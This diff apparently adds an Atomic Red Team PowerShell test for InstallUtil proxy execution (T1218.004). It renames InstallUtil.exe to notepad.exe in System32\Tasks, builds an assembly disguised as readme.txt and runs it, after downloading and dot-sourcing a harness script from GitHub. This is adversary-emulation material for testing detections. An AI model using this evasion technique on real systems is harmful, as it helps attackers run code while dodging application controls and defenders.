@@ -1,0 +1,51 @@
+#TechniqueName: Signed Binary Proxy Execution: InstallUtil
+#AtomicTestName: InstallUtil evasive invocation
+#Description: Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, "Running a transacted installation."&will be displayed, along with other information about the opperation. "The transacted install has completed." will be displayed upon completion.&
+#Language: ps1
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null
+Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"
+
+
+#commands
+# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1
+
+$InstallerAssemblyDir = "$Env:windir\System32\Tasks"
+$InstallerAssemblyFileName = 'readme.txt'
+$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+$CommandLine = "readme.txt"
+$ExpectedOutput = 'Constructor_'
+
+# Explicitly set the directory so that a relative path to readme.txt can be supplied.
+Set-Location "$Env:windir\System32\Tasks"
+
+Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe"
+
+$TestArgs = @{
+    OutputAssemblyDirectory = $InstallerAssemblyDir
+    OutputAssemblyFileName = $InstallerAssemblyFileName
+    InvocationMethod = 'Executable'
+    CommandLine = $CommandLine
+    InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe"
+}
+
+$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+if ($ActualOutput -ne $ExpectedOutput) {
+    throw @"
+Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
+Expected: $ExpectedOutput
+Actual: $ActualOutput
+"@
+}
+
+
+#cleanup_commands
+Remove-Item -Path "$Env:windir\System32\Tasks\readme.txt" -ErrorAction Ignore
+Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallLog" -ErrorAction Ignore
+Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallState" -ErrorAction Ignore
+Remove-Item -Path "$Env:windir\System32\Tasks\notepad.exe" -ErrorAction Ignore
+
